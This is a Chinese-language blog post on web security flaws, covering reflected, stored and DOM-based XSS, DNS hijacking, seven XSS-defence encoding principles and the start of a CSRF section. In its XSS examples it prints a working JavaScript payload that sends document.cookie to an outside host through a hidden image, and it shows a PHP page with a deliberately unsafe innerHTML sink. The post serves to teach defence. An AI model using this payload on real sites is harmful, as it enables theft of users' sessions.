<!DOCTYPE html>
<html lang="zh">
    <head>
    <!-- 
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.3.0 -->

    <!-- Title -->
    
    <title>
        
            web安全漏洞 | 
        
        LTH&#39;s note book
    </title>

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
    <link rel="icon" sizes="192x192" href="/img/favicon.png">
    <link rel="apple-touch-icon" href="/img/favicon.png">

    <!-- Meta & Info -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#0097A7">
    <meta name="author" content="kyjo2014">
    <meta name="description" content="html|css|javascript|LTH&#39;s blog">
    <meta name="keywords" content="123,web安全">

    <!--iOS -->
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-title" content="Title">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="480">

    <!-- Add to homescreen for Chrome on Android -->
    <meta name="mobile-web-app-capable" content="yes">

    <!-- Add to homescreen for Safari on iOS -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="LTH&#39;s note book">

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://kyjo2014.github.com">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="web安全漏洞 | LTH&#39;s note book">
    <meta property="og:description" content="html|css|javascript|LTH&#39;s blog">
    <meta property="og:article:tag" content="web安全"> 

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.zhCN.js"></script>
        
    <![endif]-->

    <!-- Import CSS -->
    <link rel="stylesheet" href="/css/material.min.css">
    <link rel="stylesheet" href="/css/style.min.css">
    <!-- Config CSS -->


<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }
</style>


<!-- Theme Background Related-->

    <style>
      body{
        background-color: #F5F5F5;
      }

      /* blog_info bottom background */
      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
        background-color: #fff;
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>



    <script src="/js/jquery.min.js"></script>
    <script src="/js/queue.js"></script>

    <!-- UC Browser Compatible -->
    <script>
        var agent = navigator.userAgent.toLowerCase();
        if(agent.indexOf('ucbrowser')>0) {
            document.write("<link rel=\"stylesheet\" href=\"/css/uc.css\">");
            alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
        }
    </script>

    

    

    <!-- Bing Background -->
    

    <!-- Custom Head -->
    
</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->

    <!-- Left aligned menu below button -->
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#web安全漏洞"><span class="post-toc-number">1.</span> <span class="post-toc-text">web安全漏洞</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#反射型XSS"><span class="post-toc-number">1.0.1.</span> <span class="post-toc-text">反射型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#存储型XSS"><span class="post-toc-number">1.0.2.</span> <span class="post-toc-text">存储型XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#DOM-Based-XSS"><span class="post-toc-number">1.0.3.</span> <span class="post-toc-text">DOM Based XSS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"><span class="post-toc-number">1.0.4.</span> <span class="post-toc-text">1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码"><span class="post-toc-number">1.0.5.</span> <span class="post-toc-text">2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"><span class="post-toc-number">1.0.6.</span> <span class="post-toc-text">3. 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码方式："><span class="post-toc-number">1.0.6.1.</span> <span class="post-toc-text">编码方式：</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"><span class="post-toc-number">1.0.7.</span> <span class="post-toc-text">4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码格式："><span class="post-toc-number">1.0.7.1.</span> <span class="post-toc-text">编码格式：</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"><span class="post-toc-number">1.0.8.</span> <span class="post-toc-text">5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#编码方式：同原则4"><span class="post-toc-number">1.0.8.1.</span> <span class="post-toc-text">编码方式：同原则4</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码"><span class="post-toc-number">1.0.9.</span> <span class="post-toc-text">6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#7-使用富文本时，使用XSS规则引擎进行编码过滤"><span class="post-toc-number">1.0.10.</span> <span class="post-toc-text">7. 使用富文本时，使用XSS规则引擎进行编码过滤</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2-csrf"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">2. csrf</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session-Cookie”，又称为“临时Cookie”；另一种是”Third-party-Cookie”-也成为“本地Cookie”。两者区别在于，Third-party-Cookie-是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part-Cookie。"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">攻击成功的原因：主要是因为用户的浏览器成功发送了Cookie（Cookie是浏览器的一个存储空间，常用来存储用户的身份验证信息）。浏览器所持有的Cookie分为两种：一种是“Session Cookie”，又称为“临时Cookie”；另一种是”Third-party Cookie”,也成为“本地Cookie”。两者区别在于，Third-party Cookie 是服务器在Set-Cookie时制定了过期时间，只有到了过期时间之后Cookie才会失效，所以这种Cookie会保存在本地。而SessionCookie则没有指定过期时间，在浏览器关闭后，SessionCookie就立马失效了。所以csrf攻击主要依赖于可以持久化的Third-part Cookie。</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#防御方式："><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">防御方式：</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#点击劫持"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">点击劫持</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flash点击劫持"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">flash点击劫持</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#点击劫持的防御"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">点击劫持的防御</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#frame-busting"><span class="post-toc-number">1.2.2.1.</span> <span class="post-toc-text">frame busting</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#x-frame-option"><span class="post-toc-number">1.2.2.2.</span> <span class="post-toc-text">x-frame-option</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CRLF注入攻击"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">CRLF注入攻击</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决方式"><span class="post-toc-number">1.2.3.1.</span> <span class="post-toc-text">解决方式</span></a></li></ol></li></ol></li></ol></li></ol>

        <!--
        <li class="mdl-menu__item">
            Some Action
        </li>
        -->
    </ul>




<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        
            <!-- Random Thumbnail -->
            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
            <script>
    var randomNum = Math.floor(Math.random() * 19 + 1);

    $('.post_thumbnail-random').css('background-image', 'url(' + '/img/random/material-' + randomNum + '.png' + ')');
</script>

        
    
            <p class="article-headline-p">
                web安全漏洞
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/myavatar.jpg" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>kyjo2014</strong>
        <span>3月 15, 2017</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    

    <!-- Tags (bookmark) -->
    
    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
        <i class="material-icons" role="presentation">bookmark</i>
        <span class="visuallyhidden">bookmark</span>
    </button>
    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
        <li class="mdl-menu__item">
        <a class="post_tag-link" href="/tags/web安全/">web安全</a>
    </ul>
    

    <!-- Share -->
    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=web安全漏洞&url=http://kyjo2014.github.com//2017/03/15/web安全漏洞/index.html&pic=&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=web安全漏洞&url=http://kyjo2014.github.com//2017/03/15/web安全漏洞/index.html&via=kyjo2014" target="_blank">
            <li class="mdl-menu__item">
                分享到 Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://kyjo2014.github.com//2017/03/15/web安全漏洞/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    
        <a class="post_share-link" href="https://plus.google.com/share?url=http://kyjo2014.github.com//2017/03/15/web安全漏洞/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Google+
            </li>
        </a>
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    

    <!-- Share Telegram -->
    
</ul>

</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <h1 id="web安全漏洞"><a href="#web安全漏洞" class="headerlink" title="web安全漏洞"></a>web安全漏洞</h1><p>今天就来谈一下web开发的时候要注意哪些安全漏洞，了解这方面知识首推两本书，《<a href="https://book.douban.com/subject/10546925/" target="_blank" rel="external">白帽子讲web安全</a>》和《<a href="https://book.douban.com/subject/25733421/" target="_blank" rel="external">web之困</a>》。<br><br>下面列出常见的web攻击</p>
<ol>
<li>跨站脚本攻击（xss）</li>
<li>dns劫持（dns缓存，dns转发）</li>
<li>跨站点请求伪造（CSRF）</li>
<li>点击劫持（clickJacking）</li>
<li>CRLF注入攻击（篡改头部）</li>
<li>文件上传漏洞</li>
<li>SSRF漏洞</li>
<li>DDos攻击</li>
<li>SQL注入攻击</li>
</ol>
<hr>
<p>##XSS</p>
<p><em>以下内容节选自《白帽子讲web安全》</em></p>
<blockquote>
<p>跨站脚本攻击，全称是Cross Site Script，本来缩写是css，但是为了和样式表有所区别，所以在安全领域叫做“xss”。XSS攻击，通常指黑客通过”HTML注入”篡改了网页，插入了恶意的脚本，蓉儿在用户浏览网页时，控制用户浏览器的一种攻击。<br><br>XSS有三种类型<br>第一种类型：</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单地把用户输入的数据“反射“到浏览器，也就是说，黑客往往需要有使用户”点击”一个恶意链接，才能攻击成功。反射型XSS也叫做”非持久型XSS”<br>这段话看起来比较复杂，其实反射型XSS的实现比较简单。攻击成功有个前提，所在网页有脚本从URL获取信息的，例如有时候跨域传送消息会使用location.hash，这时候如果在hash里面插入JavaScript语句，那么脚本在获取信息的时候就会执行恶意语句，从而导致用户信息外泄。<br><em>例子</em></p>
<ol>
<li>先写一个站点会直接把发送的value直接写入到返回的body中</li>
<li>构造恶意代码，可以用document.cookie获取cookie<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//输入框中输入这段代码，由于后台会把输入的值直接返回，那么久这段代码就会被执行</div><div class="line">var img = document.createElement(&apos;img&apos;);</div><div class="line">img.src=&apos;http://www.xss.com?cookie=&apos;+document.cookie;</div><div class="line">img.style.display=&apos;none&apos;;</div><div class="line">document.getElementsByTagName(&apos;body&apos;)[0].appendChild(img);</div></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<p>第二种类型:</p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
<p>存储型XSS会把用户输入的数据”存储”在服务器端。这种XSS具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。<strong>黑客把恶意的脚本保存到服务器端</strong>，所以这种XSS攻击就叫做”存储型XSS”<br><em>例子</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//文章中加入下列字段，由于图片是不可视的所以用户完全不会有任何感觉</div><div class="line">var img = document.createElement(&apos;img&apos;);</div><div class="line">img.src=&apos;http://www.xss.com?cookie=&apos;+document.cookie;</div><div class="line">img.style.display=&apos;none&apos;;</div><div class="line">document.getElementsByTagName(&apos;body&apos;)[0].appendChild(img);</div></pre></td></tr></table></figure></p>
</blockquote>
<p>第三种类型：</p>
<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><blockquote>
<p>从效果上来说也是反射型XSS。单独划分出来，是因为其形成原因比较特别，发现他的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。<em>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</em><br><strong><em>domxss取决于输出位置，并不取决于输出环境，因此domxss既有可能是反射型的，也有可能是存储型的</em></strong></p>
</blockquote>
<p>意思上就是通过传入一个DOM节点的代码，使得受攻击页面中被插入了攻击的脚本或者dom节点。相比于反射型XSS通过传入数据的方式进行影响页面，DOM base型限制了传入数据的类型。</p>
<p><em>例子</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">$name = $_GET[&quot;name&quot;];</div><div class="line">?&gt;</div><div class="line">&lt;input id=&quot;text&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $name;?&gt;&quot; /&gt;</div><div class="line">&lt;div id=&quot;print&quot;&gt;&lt;/div&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">var text = document.getElementById(&quot;text&quot;); </div><div class="line">var print = document.getElementById(&quot;print&quot;);</div><div class="line">print.innerHTML = text.value; // 获取 text的值，并且输出在print内。这里是导致xss的主要原因。</div><div class="line">&lt;/script&gt;</div><div class="line"></div><div class="line">作者：梧桐雨</div><div class="line">链接：https://www.zhihu.com/question/26628342/answer/33504799</div><div class="line">来源：知乎</div><div class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</div></pre></td></tr></table></figure></p>
<ol>
<li>dns劫持（路由劫持）</li>
</ol>
<p>dns劫持：用户输入了正确的域名但是dns服务器返回了其他网站的ip地址。</p>
<p>解决方式：使用https进行全站加密。HTTPS是建立在SSL层上的HTTP协议，当建立连接的时候，客户端会打开一条到服务器端口443的链接然后交换一些SSL安全参数。例如安全密钥，加密参数等。</p>
<blockquote>
<p>HTTPS提供了端到端的安全加密不仅提供数据机密性（加密），还提供数据完整性（不篡改数据）保护、防重放（把捕获的报文再发一次无效），这样坏小子就很难下手，没有session key 很难去偷窥并篡改用户的数据，更无法依赖HTTPS这个载体植入木马。一定有同学会有疑问，为何明文传输的HTTP可以被劫持，篡改网页内容，而加密传输的HTTPS却不可以？那是因为HTTP被劫持篡改页面，重新计算TCP checksum，用户电脑是无法判别是否被篡改，只好被动接收。而加密传输之后，有了HMAC保护，任何篡改页面的尝试，由于没有session key，无法计算出和篡改网页一致的HMAC，所以数据接收端的SSL/TLS会轻易地识别出网页已被篡改，然后丢弃，既然无法劫持，也就没有篡改的冲动了，所以HTTPS可以很好地对付网页劫持。<br>作者：车小胖<br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<p>##防御XSS方法：</p>
<p>主要需要以下七条原则：</p>
<p><em>下列防御方法参考<a href="http://www.oschina.net/news/43919/7-principles-of-defense-xss" target="_blank" rel="external">防御 XSS 的七条原则</a></em></p>
<h3 id="1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"><a href="#1-不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码" class="headerlink" title="1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码"></a>1. 不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</h3><h3 id="2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码"><a href="#2-在将不可信数据插入到HTML标签之间时，对这些数据进行HTML-Entity编码" class="headerlink" title="2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码"></a>2. 在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</h3><blockquote>
<p>在这里相当强调是往HTML标签之间插入不可信数据，以区别于往HTML标签属性部分插入不可信数据，因为这两者需要进行不同类型的编码。<br>对<strong>标签之间</strong>插入不可信数据时转码规则是下列：</p>
</blockquote>
<table>
<thead>
<tr>
<th>符号</th>
<th style="text-align:center">编码</th>
</tr>
</thead>
<tbody>
<tr>
<td>&amp;</td>
<td style="text-align:center">\&amp;</td>
</tr>
<tr>
<td>&lt;</td>
<td style="text-align:center">\&lt;</td>
</tr>
<tr>
<td>&gt;</td>
<td style="text-align:center">\&gt;</td>
</tr>
<tr>
<td>”</td>
<td style="text-align:center">\&quot;</td>
</tr>
<tr>
<td>‘</td>
<td style="text-align:center">\&#x27;</td>
</tr>
<tr>
<td>/</td>
<td style="text-align:center">\&#x2f;</td>
</tr>
</tbody>
</table>
<p><em>注意</em>：可以使用OWASP提供的<a href="https://www.owasp.org/index.php/ESAPI" target="_blank" rel="external">ESAPI</a>函数库，它提供了一系列非常严格的用于进行各种安全编码的函数。</p>
<h3 id="3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"><a href="#3-在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码" class="headerlink" title="3. 在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码"></a>3. 在将不可信数据插入到<strong>HTML属性</strong>里时，对这些数据进行HTML属性编码</h3><h4 id="编码方式："><a href="#编码方式：" class="headerlink" title="编码方式："></a>编码方式：</h4><blockquote>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）<br><em>在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符 进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击</em></p>
</blockquote>
<h3 id="4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"><a href="#4-在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码" class="headerlink" title="4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码"></a>4. 在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</h3><p>这条原则主要针对动态生成的JavaScript代码，这包括脚本部分以及HTML标签的事件处理属性（Event Handler，如onmouseover, onload等）。  </p>
<h4 id="编码格式："><a href="#编码格式：" class="headerlink" title="编码格式："></a>编码格式：</h4><p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字）</p>
<h3 id="5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"><a href="#5-在将不可信数据插入到Style属性里时，对这些数据进行CSS编码" class="headerlink" title="5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码"></a>5. 在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</h3><p>由于css其实不单只能够影响页面布局和样式，其实其一样可以执行脚本，如url，老旧的expressionAPI等，从而对网页进行攻击。</p>
<h4 id="编码方式：同原则4"><a href="#编码方式：同原则4" class="headerlink" title="编码方式：同原则4"></a>编码方式：同原则4</h4><blockquote>
<p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）</p>
</blockquote>
<h3 id="6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码"><a href="#6-在将不可信数据插入到HTML-URL里时，对这些数据进行URL编码" class="headerlink" title="6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码"></a>6. 在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</h3><p>除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）</p>
<p>在对URL进行编码的时候，有两点是需要特别注意的：</p>
<p>1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码</p>
<p>2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>
<h3 id="7-使用富文本时，使用XSS规则引擎进行编码过滤"><a href="#7-使用富文本时，使用XSS规则引擎进行编码过滤" class="headerlink" title="7. 使用富文本时，使用XSS规则引擎进行编码过滤"></a>7. 使用富文本时，使用XSS规则引擎进行编码过滤</h3><p>Web应用一般都会提供用户输入富文本信息的功能，比如BBS发帖，写博客文章等，用户提交的富文本信息里往往包含了HTML标签，甚至是 JavaScript脚本，如果不对其进行适当的编码过滤的话，则会形成XSS漏洞。但我们又不能因为害怕产生XSS漏洞，所以就不允许用户输入富文本， 这样对用户体验伤害很大。</p>
<p>针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如\<b\>, \<i\>, \<p\>等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在\<div\>, \<p\>等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到\<script\> 标签里。</script\></p\></div\></p\></i\></b\></p>
<h2 id="2-csrf"><a href="#2-csrf" class="headerlink" title="2. csrf"></a>2. csrf</h2><p><em>之前在阿里面试的时候，这个问题被面试官问得哑口无言，特别回来总结一波</em></p>
<blockquote>
<p>CSRF的全名是Cross site RequestForgery,翻译成中文就是跨站点请求伪造。是一种常见的web攻击方式。</p>
</blockquote>
<p>与前面介绍的“跨站脚本攻击”（XSS）有关，当时在《白帽子》一书中讲述了一个“删除搜狐博客文章”的例子，当时是使用了一个攻击链接，但仍需要用户是处于自己正常登录的博客页面当中才能进行攻击。而进行csrf攻击的话是根本不需要用户保持上述的状态。即使用户在攻击者提供的虚假页面上，也能对“搜狐博客”进行攻击。</p>
